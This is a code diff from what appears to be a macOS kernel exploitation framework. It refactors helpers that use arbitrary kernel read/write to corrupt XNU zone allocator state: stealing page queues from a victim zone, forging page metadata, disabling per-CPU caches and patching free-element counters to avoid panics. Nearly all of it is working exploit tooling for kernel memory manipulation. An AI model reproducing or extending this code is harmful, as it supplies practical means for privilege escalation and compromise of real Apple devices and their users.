@@ -11,6 +11,8 @@
 #include "util/misc.h"
 #include "util/log.h"
 #include "util/zalloc.h"
+#include "util/dispatch.h"
+#include "allocator/large_mem.h"
 
 #include "macos_params.h"
 
@@ -30,6 +32,9 @@ struct xe_util_zalloc {
 
 typedef struct xe_util_zalloc* xe_util_zalloc_t;
 
+static dispatch_once_t xe_util_zalloc_z_pcpu_cache_init_once;
+static uintptr_t xe_util_zalloc_z_pcpu_cache;
+
 
 uintptr_t xe_util_zalloc_pva_to_addr(uint32_t pva) {
     return (uintptr_t)(int32_t)pva << XE_PAGE_SHIFT;
@@ -41,6 +46,23 @@ uintptr_t xe_util_zalloc_find_zone_at_index(uint zone_index) {
 
 uint xe_util_zalloc_zone_to_index(uintptr_t zone) {
     return (uint)((zone - xe_slider_kernel_slide(VAR_ZONE_ARRAY_ADDR)) / TYPE_ZONE_SIZE);
+}
+
+void xe_util_zalloc_enable_zone_rsv(uintptr_t zone) {
+    uint16_t z_elem_size = xe_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
+    uint16_t z_elems_rsv = xe_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEMS_RSV_OFFSET);
+    
+    int num_reserved = (XE_PAGE_SIZE * 2 + z_elem_size - 1) / z_elem_size;
+    num_reserved = num_reserved < 32 ? 32 : num_reserved;
+    
+    if (z_elems_rsv >= num_reserved) {
+        return;
+    }
+    
+    xe_kmem_write_uint16(zone, TYPE_ZONE_MEM_Z_ELEMS_RSV_OFFSET, num_reserved);
+    
+    // Mark zone for async zone expansion
+    xe_kmem_write_bitfield_uint64(zone, TYPE_ZONE_BF0_OFFSET, 1, TYPE_ZONE_BF0_MEM_Z_ASYNC_REFILLING_OFFSET, TYPE_ZONE_BF0_MEM_Z_ASYNC_REFILLING_SIZE);
 }
 
 uintptr_t xe_util_zalloc_pageq_to_meta(uint32_t pageq) {
@@ -170,14 +192,9 @@ uint32_t xe_util_zalloc_steal_pageq(int required_chunk_pages, int required_bitma
     uint32_t z_elems_avail = xe_kmem_read_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_AVAIL_OFFSET);
     xe_kmem_write_uint32(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_AVAIL_OFFSET, z_elems_avail - elems_lost);
     
-    uint16_t z_elems_rsv = xe_kmem_read_uint16(victim_zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
-    if (!z_elems_rsv) {
-        // May help avoid zone z_elems_free accounting panic in case we corrupted
-        // the field while mutating without lock
-        int num_reserved = (XE_PAGE_SIZE * 2 + z_elem_size - 1) / z_elem_size;
-        num_reserved = num_reserved < 16 ? 16 : num_reserved;
-        xe_kmem_write_uint16(victim_zone, TYPE_ZONE_MEM_Z_ELEMS_RSV_OFFSET, num_reserved);
-    }
+    // May help avoid zone z_elems_free accounting panic in case we corrupted
+    // the field while mutating without lock
+    xe_util_zalloc_enable_zone_rsv(victim_zone);
     
     if (victim_zone_out) {
         *victim_zone_out = victim_zone;
@@ -257,11 +274,44 @@ void xe_util_zalloc_intialize_stolen_pageq(xe_util_zalloc_t util) {
     xe_assert_cond(chunk_len - 1, <=, ZM_CHUNK_LEN_MAX);
     xe_util_zalloc_init_bitmap(meta, chunk_len, util->num_allocs);
     
-    // Make sure the pageq never becomes full and gets requeued to z_pageq_full
+    // Make sure the pageq never becomes full and gets queued to z_pageq_full
     xe_kmem_write_bitfield_uint16(meta, TYPE_ZONE_PAGE_METADATA_BF0_OFFSET, chunk_len + 1, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_CHUNK_LEN_BIT_OFFSET, TYPE_ZONE_PAGE_METADATA_BF0_MEM_ZM_CHUNK_LEN_BIT_SIZE);
     
-    // Make sure the pageq never gets empty and gets requeued to z_pageq_empty
+    // Make sure the pageq never becomes empty and gets queued to z_pageq_empty
     xe_kmem_write_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET, 1);
+}
+
+
+void xe_util_zalloc_disable_pcpu_cache(uintptr_t zone) {
+    uint32_t z_recirc_cur = xe_kmem_read_uint32(zone, TYPE_ZONE_MEM_Z_RECIRC_CUR_OFFSET);
+    xe_kmem_write_bitfield_uint64(zone, TYPE_ZONE_BF0_OFFSET, 1, TYPE_ZONE_BF0_MEM_Z_NOCACHING_BIT_OFFSET, TYPE_ZONE_BF0_MEM_Z_NOCACHING_BIT_SIZE);
+    
+    if (z_recirc_cur) {
+        dispatch_once(&xe_util_zalloc_z_pcpu_cache_init_once, ^() {
+            xe_log_debug("intializing xe_util_zalloc_z_pcpu_cache");
+            uint num_cpus = xe_kmem_read_uint32(xe_slider_kernel_slide(VAR_ZPERCPU_EARLY_COUNT), 0);
+            size_t alloc_size = num_cpus << XE_PAGE_SHIFT;
+            xe_util_zalloc_z_pcpu_cache = xe_allocator_large_mem_allocate_disowned(alloc_size);
+            char* temp = malloc(alloc_size);
+            bzero(temp, alloc_size);
+            xe_kmem_write(xe_util_zalloc_z_pcpu_cache, 0, temp, alloc_size);
+            free(temp);
+        });
+        
+        // NOTE: Simply setting z_pcpu_cache to NULL will lead to system freeze
+        // FIXME: find out why
+        xe_log_warn("disabling pcpu cache for zone %p with z_recirc_cur: %d", (void*)zone, z_recirc_cur);
+        // Make sure zone_caching never gets enabled by `compute_zone_working_set_size`
+        xe_kmem_write_int8(xe_slider_kernel_slide(VAR_ZONE_CACHING_DISABLED), 0, -1);
+        // Zero out z_pcpu_cache for all CPUs
+        xe_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET, xe_util_zalloc_z_pcpu_cache);
+        // Zero out z_recirc
+        xe_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_RECIRC_OFFSET, 0);
+        xe_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_RECIRC_OFFSET + 8, zone + TYPE_ZONE_MEM_Z_RECIRC_CUR_OFFSET);
+        xe_kmem_write_uint32(zone, TYPE_ZONE_MEM_Z_RECIRC_CUR_OFFSET, 0);
+    } else {
+        xe_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET, 0);
+    }
 }
 
 
@@ -269,7 +319,6 @@ xe_util_zalloc_t xe_util_zalloc_create(uintptr_t zone, int num_allocs) {
     uint16_t z_elem_size = xe_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEM_SIZE_OFFSET);
     _Bool z_percpu = xe_kmem_read_bitfield_uint64(zone, TYPE_ZONE_BF0_OFFSET, TYPE_ZONE_BF0_MEM_Z_PERCPU_BIT_OFFSET, TYPE_ZONE_BF0_MEM_Z_PERCPU_BIT_SIZE);
     uintptr_t z_pcpu_cache = xe_kmem_read_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET);
-    uint16_t z_elems_rsv = xe_kmem_read_uint16(zone, TYPE_ZONE_MEM_Z_ELEMS_RSV_OFFSET);
     
     // Not supported for now
     xe_assert(!z_percpu);
@@ -278,14 +327,7 @@ xe_util_zalloc_t xe_util_zalloc_create(uintptr_t zone, int num_allocs) {
         // Disable zone caching since freed elements will not always be
         // written back to bitmaps in zone page metadata
         xe_log_warn("disabling zone caching for zone %p", (void*)zone);
-        uint16_t z_recirc_cur = xe_kmem_read_uint32(zone, TYPE_ZONE_MEM_Z_RECIRC_CUR_OFFSET);
-        xe_kmem_write_bitfield_uint64(zone, TYPE_ZONE_BF0_OFFSET, 0, TYPE_ZONE_BF0_MEM_Z_NOCACHING_BIT_OFFSET, TYPE_ZONE_BF0_MEM_Z_NOCACHING_BIT_SIZE);
-        xe_kmem_write_uint32(zone, TYPE_ZONE_MEM_Z_RECIRC_CUR_OFFSET, 0);
-        xe_kmem_write_uint64(zone, TYPE_ZONE_MEM_Z_PCPU_CACHE_OFFSET, 0);
-        xe_kmem_write_uint32(zone, TYPE_ZONE_MEM_Z_RECIRC_CUR_OFFSET, 0);
-        uint16_t z_elems_free = xe_kmem_read_uint32(zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET);
-        xe_assert_cond(z_elems_free, >, z_recirc_cur);
-        xe_kmem_write_uint32(zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET, z_elems_free - z_recirc_cur);
+        xe_util_zalloc_disable_pcpu_cache(zone);
     }
     
     int required_chunk_pages = (z_elem_size * num_allocs + XE_PAGE_SIZE - 1) / XE_PAGE_SIZE;
@@ -300,14 +342,9 @@ xe_util_zalloc_t xe_util_zalloc_create(uintptr_t zone, int num_allocs) {
     util->num_allocs = num_allocs;
     xe_util_zalloc_intialize_stolen_pageq(util);
     
-    if (!z_elems_rsv) {
-        // May help avoid zone z_elems_free accounting panic in case we corrupted
-        // the field while mutating without lock
-        int num_reserved = (XE_PAGE_SIZE * 2 + z_elem_size - 1) / z_elem_size;
-        num_reserved = num_reserved < 16 ? 16 : num_reserved;
-        xe_kmem_write_uint16(zone, TYPE_ZONE_MEM_Z_ELEMS_RSV_OFFSET, num_reserved);
-    }
-    
+    // May help avoid zone z_elems_free accounting panic in case we corrupted
+    // the field while mutating without lock
+    xe_util_zalloc_enable_zone_rsv(zone);
     return util;
 }
 
@@ -353,15 +390,12 @@ int xe_util_zalloc_meta_clear_bit(uintptr_t meta, int eidx) {
 }
 
 
-void xe_util_zalloc_wait_dec(xe_util_zalloc_t util) {
-    while (1) {
-        uint32_t z_elem_free = xe_kmem_read_uint32(util->recipient_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET);
-        if (z_elem_free > 1) {
-            xe_kmem_write_uint32(util->recipient_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET, z_elem_free - 1);
-            break;
-        }
-        xe_log_debug("waiting for z_elems_free to increase");
-        sleep(1);
+void xe_util_zalloc_dec_z_elem_free(xe_util_zalloc_t util) {
+    uint32_t z_elem_free = xe_kmem_read_uint32(util->recipient_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET);
+    if (z_elem_free > 0) {
+        xe_kmem_write_uint32(util->recipient_zone, TYPE_ZONE_MEM_Z_ELEMS_FREE_OFFSET, z_elem_free - 1);
+    } else {
+        xe_log_warn("could not decrement z_elem_free for zone %p since it was zero", (void*)util->recipient_zone);
     }
 }
 
@@ -375,7 +409,7 @@ uintptr_t xe_util_zalloc_alloc(xe_util_zalloc_t util, int element_idx) {
     uint16_t zm_alloc_size = xe_kmem_read_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET);
     xe_kmem_write_uint16(meta, TYPE_ZONE_PAGE_METADATA_MEM_ZM_ALLOC_SIZE_OFFSET, zm_alloc_size + z_elem_size);
     
-    xe_util_zalloc_wait_dec(util);
+    xe_util_zalloc_dec_z_elem_free(util);
     
     uintptr_t page = xe_util_zalloc_pva_to_addr(util->stolen_pageq);
     return page + element_idx * z_elem_size;
